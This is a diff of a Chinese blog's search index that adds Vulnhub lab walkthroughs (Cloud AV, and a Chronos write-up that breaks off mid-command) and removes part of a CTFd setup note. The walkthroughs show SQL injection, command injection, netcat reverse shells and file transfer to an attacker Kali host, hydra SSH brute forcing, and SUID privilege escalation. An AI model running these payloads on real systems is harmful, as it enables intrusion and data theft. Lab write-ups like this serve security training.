-<td align="center"><code>80</code></td>
-</tr>
-<tr>
-<td align="center">Initial Value</td>
-<td align="center"><code>1</code></td>
-</tr>
-<tr>
-<td align="center">Decay Limit</td>
-<td align="center"><code>1</code></td>
-</tr>
-<tr>
-<td align="center">Minimum Value</td>
-<td align="center"><code>1</code></td>
-</tr>
-<tr>
-<td align="center">Score Type</td>
-<td align="center"><code>dynamic score</code></td>
-</tr>
-</tbody></table>
-<ul>
-<li>新建题目过后点击启动，然后等待靶机创建，可以在服务器中 <code>docker ps -a</code> 查看是否启动，若启动成功则搭建完成。</li>
-</ul>
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/Whale_0830.png" alt="Whale_0830" />
-
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/Whale_0830 (2).png" alt="Whale_0830 (2)" />
-
-<h1 id="端口修改"><a href="#端口修改" class="headerlink" title="端口修改"></a>端口修改</h1><ul>
-<li>VaalaCat 师傅仓库中所使用的端口一共有三类，需要修改平台信息请按照以下文件位置修改： <ul>
-<li>9123（一般用不到，都采用直连）: <ul>
-<li>默认 http 模式靶机访问端口，需要修改 <code>frps.ini</code>、后台中的 <code>Http Port</code>、<code>docker-compose.yml</code></li>
-</ul>
-</li>
-<li>9124: <ul>
-<li>默认为 ctfd 端口，需要修改 <code>docker-compose.yml</code></li>
-</ul>
-</li>
-<li>9125-9129: <ul>
-<li>动态靶机 Direct 模式端口，需要修改 <code>docker-compose.yml</code>、后台中的端口范围</li>
-</ul>
+<li><p>SQL 注入</p>
 </li>
 </ul>
 </li>
+</ul>
+<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><ul>
+<li>在输入框进行测试，当使用双引号时，页面出现报错：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222346521.png" alt="image-20230830222346521"></p>
+<ul>
+<li>并且在页面上出现了 SQL 查询语句：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if len(c.execute(&#x27;select * from code where password=&quot;&#x27; + password + &#x27;&quot;&#x27;).fetchall()) &gt; 0:</span><br><span class="line"></span><br><span class="line">select * from code where password=&quot;&#x27; + password + &#x27;&quot;</span><br><span class="line"></span><br><span class="line">select * from code where password=&quot; &quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现闭合符号为双引号，尝试闭合：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot; or 1 = 1 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222404690.png" alt="image-20230830222404690"></p>
+<ul>
+<li>闭合成功，按钮变为 Scan，扫个 hello 试试：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222417126.png" alt="image-20230830222417126"></p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
+<li>猜测后端代码逻辑为，尝试是否存在命令执行：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scan hello</span><br><span class="line"></span><br><span class="line">scan hello ; ls</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现执行成功，显示出文件：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222437476.png" alt="image-20230830222437476"></p>
+<h1 id="Shell-反弹"><a href="#Shell-反弹" class="headerlink" title="Shell 反弹"></a>Shell 反弹</h1><ul>
+<li>由于对端是 Linux 系统，查看一下是否存在 NC：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hello | which nc</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222459677.png" alt="image-20230830222459677"></p>
+<ul>
+<li>发现存在有 NC，使用 NC 进行 Shell 反弹：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Kali 上使用 NC 开启监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 4444                     </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上进行反弹</span></span><br><span class="line">hello | nc 192.168.56.105 4444 -e /bin/sh # 执行失败，可能是此版本的 NC 不支持 -e 参数</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个监听端口</span></span><br><span class="line">nc -lvvp 3333</span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上反弹</span></span><br><span class="line">hello |nc 192.168.56.105 3333 |/bin/bash |nc 192.168.56.105 4444 # 当不支持 -e 参数时，使用 NC 进行串联</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222511694.png" alt="image-20230830222511694"></p>
+<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><ul>
+<li>在当前目录下发现了一个 SQL 文件，使用 NC 将其下载到 Kali 上：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上再开一个 NC 监听用于传输文件</span></span><br><span class="line">nc -lvvp 5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 NC 的 3333 端口上进行文件传输</span></span><br><span class="line">nc 192.168.56.105 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222530665.png" alt="image-20230830222530665"></p>
+<ul>
+<li>经过判断，发现是一个 sqlite 文件，将其导入到 sqlite 中查看：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlite3</span><br><span class="line">SQLite version 3.39.2 2022-07-21 15:24:47</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">Connected to a transient in-memory database.</span><br><span class="line">Use &quot;.open FILENAME&quot; to reopen on a persistent database.</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.open db.sql</span></span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.database</span></span><br><span class="line">main: /root/db.sql r/w</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.dump</span></span><br><span class="line">PRAGMA foreign_keys=OFF;</span><br><span class="line">BEGIN TRANSACTION;</span><br><span class="line">CREATE TABLE `code` (</span><br><span class="line">        `password`      TEXT</span><br><span class="line">);</span><br><span class="line">INSERT INTO code VALUES(&#x27;myinvitecode123&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mysecondinvitecode&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;cloudavtech&#x27;);</span><br><span class="line">INSERT INTO code VALUES(&#x27;mostsecurescanner&#x27;);</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>建档尝试了一下，发现是开头登录的邀请码，好像没啥用，那就先放一放。</li>
+<li>查看一下当前靶机的所有用户：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222622625.png" alt="image-20230830222622625"></p>
+<ul>
+<li>发现两个用户，但是好像也没用。</li>
+</ul>
+<h1 id="SSH-爆破"><a href="#SSH-爆破" class="headerlink" title="SSH 爆破"></a>SSH 爆破</h1><ul>
+<li>根据上面数据库文件找到的密码和此处找到的用户，使用 hydra 进行爆破：</li>
+<li>创建用户、密码字典：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">user.txt</span></span><br><span class="line">vim user.txt</span><br><span class="line"></span><br><span class="line">root</span><br><span class="line">cloudav</span><br><span class="line">scanner</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pass.txt</span></span><br><span class="line">vim pass.txt</span><br><span class="line"></span><br><span class="line">myinvitecode123</span><br><span class="line">mysecondinvitecode</span><br><span class="line">cloudavtech</span><br><span class="line">mostsecurescanner</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>输入如下命令进行 SSH 爆破：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.56.107</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222647291.png" alt="image-20230830222647291"></p>
+<ul>
+<li>爆破失败..</li>
+</ul>
+<h1 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h1><ul>
+<li>再次去翻一翻文件，发现一个文件的权限不大对劲：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd .. | ls -al</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222707568.png" alt="image-20230830222707568"></p>
+<ul>
+<li>查看一下源码文件内容：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat update_cloudav.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">char *freshclam=&quot;/usr/bin/freshclam&quot;;</span><br><span class="line"></span><br><span class="line">if (argc &lt; 2)&#123;</span><br><span class="line">printf(&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;);</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);</span><br><span class="line">sprintf(command, &quot;%s %s&quot;, freshclam, argv[1]);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(command);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其中有句：<code>This tool lets you update antivirus rules, Please supply command line arguments for freshclam</code>，翻译一下是说明可以在后面添加参数，尝试一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">随便加一个参数</span></span><br><span class="line">./update_cloudav &quot;123&quot; # 显示报错：ERROR: /var/log/clamav/freshclam.log is locked by another process</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不管他，尝试命令执行</span></span><br><span class="line">./update_cloudav &quot;123 | ls&quot; # 执行成功！</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>既然上述命令执行可以实现，再来一次 NC Shell 反弹：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个监听端口</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line">nc -lvvp 7777</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上反弹</span></span><br><span class="line">./update_cloudav &quot;123 |nc 192.168.56.105 6666 |/bin/bash |nc 192.168.56.105 7777&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222824468.png" alt="image-20230830222824468"></p>
+<ul>
+<li>提权成功！打靶结束。</li>
+</ul>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li>在使用 SQL 注入时，也可以使用 BurpSuite 进行爆破，但是很容易扫崩，需要控制一下速率。</li>
 </ul>
 ]]></content>
       <categories>
-        <category>Docker</category>
+        <category>Vulnhub_Kali</category>
       </categories>
       <tags>
-        <tag>Docker</tag>
+        <tag>Vulnhub_Kali</tag>
       </tags>
   </entry>
   <entry>
@@ -1122,11 +1271,11 @@
       </tags>
   </entry>
   <entry>
-    <title>Easy_Cloudantivirus</title>
-    <url>/2023/01/07/Vulnhub_Kali/02.Easy_Cloudantivirus_20230107/</url>
+    <title>Chronos</title>
+    <url>/2023/01/07/Vulnhub_Kali/03.Chronos_20230107/</url>
     <content><![CDATA[<ul>
-<li>Vulnhub_Kali 填坑系列（二）启动，总体难度不大，主要考验思路。</li>
-<li>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></li>
+<li>Vulnhub_Kali 填坑系列（三）启动，总体难度不大，问题是怎么找到 EJS 的漏洞。</li>
+<li>靶机地址：<a href="https://www.vulnhub.com/entry/chronos-1,735/">https://www.vulnhub.com/entry/chronos-1,735/</a></li>
 <li>Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶机桥接吧。</li>
 </ul>
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
@@ -1138,129 +1287,176 @@
 <ul>
 <li>扫描当前网段，发现靶机 IP 地址：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:ea:40:88       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.107  08:00:27:1e:54:35       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.987 seconds (128.84 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:ea:40:88       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.108  08:00:27:58:b9:2b       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.991 seconds (128.58 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>继续使用 Nmap 扫描端口、开放服务等信息：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.107</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 02:31 EST</span><br><span class="line">Nmap scan report for 192.168.56.107</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 08:00:27:1E:54:35 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.75 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 22,8080 -sV 192.168.56.107</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 02:32 EST</span><br><span class="line">Nmap scan report for 192.168.56.107</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">MAC Address: 08:00:27:1E:54:35 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.108</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 05:57 EST</span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line">MAC Address: 08:00:27:58:B9:2B (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 22,80,8000 -sV 192.168.56.108</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 05:58 EST</span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">8000/tcp open  http    Node.js Express framework</span><br><span class="line">MAC Address: 08:00:27:58:B9:2B (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.78 seconds</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>扫描出 8080 端口的 Web 服务，通常情况下不考虑 SSH 爆破，访问一下 Web 服务：</li>
 </ul>
-<img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222318218.png" alt="image-20230830222318218" />
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830224831447.png" alt="image-20230830224831447"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830224837584.png" alt="image-20230830224837584"></p>
+<h1 id="源码解码"><a href="#源码解码" class="headerlink" title="源码解码"></a>源码解码</h1><ul>
+<li>两个端口的 Web 服务都非常简单，查看一下页面的源码，发现一段不一样的代码：</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5bdf=[<span class="string">&#x27;150447srWefj&#x27;</span>,<span class="string">&#x27;70lwLrol&#x27;</span>,<span class="string">&#x27;1658165LmcNig&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;1260881JUqdKM&#x27;</span>,<span class="string">&#x27;10737CrnEEe&#x27;</span>,<span class="string">&#x27;2SjTdWC&#x27;</span>,<span class="string">&#x27;readyState&#x27;</span>,<span class="string">&#x27;responseText&#x27;</span>,<span class="string">&#x27;1278676qXleJg&#x27;</span>,<span class="string">&#x27;797116soVTES&#x27;</span>,<span class="string">&#x27;onreadystatechange&#x27;</span>,<span class="string">&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;</span>,<span class="string">&#x27;User-Agent&#x27;</span>,<span class="string">&#x27;status&#x27;</span>,<span class="string">&#x27;1DYOODT&#x27;</span>,<span class="string">&#x27;400909Mbbcfr&#x27;</span>,<span class="string">&#x27;Chronos&#x27;</span>,<span class="string">&#x27;2QRBPWS&#x27;</span>,<span class="string">&#x27;getElementById&#x27;</span>,<span class="string">&#x27;innerHTML&#x27;</span>,<span class="string">&#x27;date&#x27;</span>];(<span class="keyword">function</span>(<span class="params">_0x506b95,_0x817e36</span>)&#123;<span class="keyword">var</span> _0x244260=_0x432d;<span class="keyword">while</span>(!![])&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x35824b=-<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x7e</span>))*<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x90</span>))+<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x8e</span>))+<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x7f</span>))*<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x83</span>))+-<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x87</span>))+-<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x82</span>))*<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x8d</span>))+-<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x88</span>))+<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x80</span>))*<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x84</span>));<span class="keyword">if</span>(_0x35824b===_0x817e36)<span class="keyword">break</span>;<span class="keyword">else</span> _0x506b95[<span class="string">&#x27;push&#x27;</span>](_0x506b95[<span class="string">&#x27;shift&#x27;</span>]());&#125;<span class="keyword">catch</span>(_0x3fb1dc)&#123;_0x506b95[<span class="string">&#x27;push&#x27;</span>](_0x506b95[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x5bdf,<span class="number">0xcaf1e</span>));<span class="keyword">function</span> <span class="title function_">_0x432d</span>(<span class="params">_0x16bd66,_0x33ffa9</span>)&#123;<span class="keyword">return</span> _0x432d=<span class="keyword">function</span>(<span class="params">_0x5bdf82,_0x432dc8</span>)&#123;_0x5bdf82=_0x5bdf82-<span class="number">0x7e</span>;<span class="keyword">var</span> _0x4da6e8=_0x5bdf[_0x5bdf82];<span class="keyword">return</span> _0x4da6e8;&#125;,<span class="title function_">_0x432d</span>(_0x16bd66,_0x33ffa9);&#125;<span class="keyword">function</span> <span class="title function_">loadDoc</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x17df92=_0x432d,_0x1cff55=<span class="title function_">_0x17df92</span>(<span class="number">0x8f</span>),_0x2beb35=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();_0x2beb35[<span class="title function_">_0x17df92</span>(<span class="number">0x89</span>)]=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x146f5d=_0x17df92;<span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x85</span>)]==<span class="number">0x4</span>&amp;&amp;<span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x8c</span>)]==<span class="number">0xc8</span>&amp;&amp;(<span class="variable language_">document</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x91</span>)](<span class="title function_">_0x146f5d</span>(<span class="number">0x93</span>))[<span class="title function_">_0x146f5d</span>(<span class="number">0x92</span>)]=<span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x86</span>)]);&#125;,_0x2beb35[<span class="title function_">_0x17df92</span>(<span class="number">0x81</span>)](<span class="string">&#x27;GET&#x27;</span>,<span class="title function_">_0x17df92</span>(<span class="number">0x8a</span>),!![]),_0x2beb35[<span class="string">&#x27;setRequestHeader&#x27;</span>](<span class="title function_">_0x17df92</span>(<span class="number">0x8b</span>),_0x1cff55),_0x2beb35[<span class="string">&#x27;send&#x27;</span>]();&#125;</span><br></pre></td></tr></table></figure>
 
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830224919868.png" alt="image-20230830224919868"></p>
 <ul>
-<li><p>只有一个输入框，需要使用邀请码登录。没啥多余的东西，这时一般是存在两种方法：</p>
-<ul>
-<li><p>暴力破解</p>
+<li>由于是出现在 <code>&lt;script&gt;</code>标签中的，所以可以认定是 JavaScript 代码，但是看代码内容像是被加密过，需要解密，由于不知道使用的加密方式，选择一个在线网站进行解密。<ul>
+<li>CyberChef： <a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></li>
+</ul>
 </li>
-<li><p>SQL 注入</p>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830224942852.png" alt="image-20230830224942852"></p>
+<ul>
+<li>根据上述步骤，可以将代码进行解密，解密完后，发现一个网址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将 format 后面的字符串进行解密（base 58）：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830225002872.png" alt="image-20230830225002872"></p>
+<ul>
+<li>发现表示的是日期时间，说明上述 URL 的作用很有可能是向 chronos.local 地址发送时间信息。</li>
+</ul>
+<h1 id="Host-修改"><a href="#Host-修改" class="headerlink" title="Host 修改"></a>Host 修改</h1><ul>
+<li>由于是 8000 端口，有理由怀疑就是指向靶机。需要修改本地 DNS 文件，将 chronos.local 域名指向靶机：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"></span><br><span class="line">192.168.56.108 chronos.local</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>再次访问 Web 服务：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830225118030.png" alt="image-20230830225118030"></p>
+<ul>
+<li>多了一行时间信息，好像还是没啥用，BurpSuite 抓包看看：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830225130853.png" alt="image-20230830225130853"></p>
+<ul>
+<li><p>发现有 3 个 URL 请求信息。第一个是正常访问，第二个是 Options 访问，第三个是 Get 请求。</p>
+<ul>
+<li>注：Options 通常是浏览器自动发起的，目的就是去服务器检查一下接下来要到用的方法（ GET、POST、PUT、detele）在服务器上是否支持；</li>
+</ul>
 </li>
 </ul>
-</li>
+<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><ul>
+<li>这里发现一个问题，在 format 跟着 base58 的时间请求，在页面上进行了显示：</li>
 </ul>
-<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><ul>
-<li>在输入框进行测试，当使用双引号时，页面出现报错：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222346521.png" alt="image-20230830222346521"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231227045.png" alt="image-20230830231227045"></p>
 <ul>
-<li>并且在页面上出现了 SQL 查询语句：</li>
+<li>那这里是否有可能存在命令执行？抱着这个疑问，去尝试一下，将 <code>;ls base58</code> 一下：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if len(c.execute(&#x27;select * from code where password=&quot;&#x27; + password + &#x27;&quot;&#x27;).fetchall()) &gt; 0:</span><br><span class="line"></span><br><span class="line">select * from code where password=&quot;&#x27; + password + &#x27;&quot;</span><br><span class="line"></span><br><span class="line">select * from code where password=&quot; &quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">现在 Kali 上执行 <span class="built_in">date</span> 命令</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br><span class="line">Today is Saturday, January 07, 2023 08:21:52.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;;ls</span><br><span class="line">Today is Saturday, January 07, 2023 08:22:19.</span><br><span class="line">Desktop  Documents  Downloads  icmptunnel  Music  Pictures  Public  Templates  Videos</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">说明命令执行是成立的，将其 base58 